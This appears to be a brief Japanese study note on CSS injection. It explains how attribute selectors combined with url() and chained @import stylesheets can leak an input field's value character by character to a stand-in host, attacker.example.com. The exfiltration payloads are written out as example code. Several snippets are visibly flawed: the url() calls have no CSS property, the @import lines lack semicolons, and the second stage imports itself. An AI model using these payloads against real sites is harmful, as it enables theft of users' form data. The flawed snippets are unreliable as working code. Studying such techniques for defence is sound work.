# CSS Injection

- [\# CSS Injection とは](#CSS-Injection-とは)
- [\# Attribute Selector について](#Attribute-Selector-について)
- [\# CSS での HTTP Request について](#CSS-での-HTTP-Request-について)
- [\# Injection](#Injection)


## CSS Injection とは

HTML に対して CSS を挿入することで Web ページ上の機密情報の取得を狙う攻撃のこと。XSSとは異なる分類。

## Attribute Selector について

CSS には Attribute Selector と呼ばれるものがあり、ある要素の属性に条件を与え、その条件を満たす場合のみ CSS を適応する。

例) a 要素の href 属性が *http://* から始まる場合、赤色にする
```css
a[href^="http://"] {
	color: red;
}
```

## CSS での HTTP Request について

CSS では特定の URL を引数にファイル等を参照するための **URL** 関数が用意されている。

```css
body {
	background: url(http://example.com/bg.png);
}
```


## Injection

Attribute Selector と URL 関数を利用することで、属性の値を調べることができる。
簡潔に言うと、総当りする。

```css
input[value^=a] {
	url(http://attacker.example.com/?value=a);
}
input[value^=b] {
	url(http://attacker.example.com/?value=b);
}
...
```

しかし、すべての通りを記述するのは現実的でないため
*@import url(...)* を利用する

**Step 1:** 起点となる CSS ファイルを読み込むコードを挿入する
```html
<link rel="stylesheet" href="http://attacker.example.com/evil_1.css">
```

evil_1.css
```css
/*Step2の読み込みを開始*/
@import url(http://attacker.example.com/evil_2.css)
input[value^=a] {
	url(http://attacker.example.com/getter.php?value=a);
}
...
```

**Step 2:** evil_1.css の*@import url(..)*を受けるが、
*value*の値を待ち、その値によって css を変えてから
*＠import url()*に対しレスポンスをする。

evil_2.css
```css
/*Step3の読み込みを開始*/
@import url(http://attacker.example.com/evil_2.css)
/*一文字目が"l"の場合*/
input[value^=la] {
	url(http://attacker.example.com/?value=la);
}
...
```

以降繰り返し。

> hidden 属性では使えなかった。抜け道あり？

> 検索ボックス内の value から検索内容を盗む？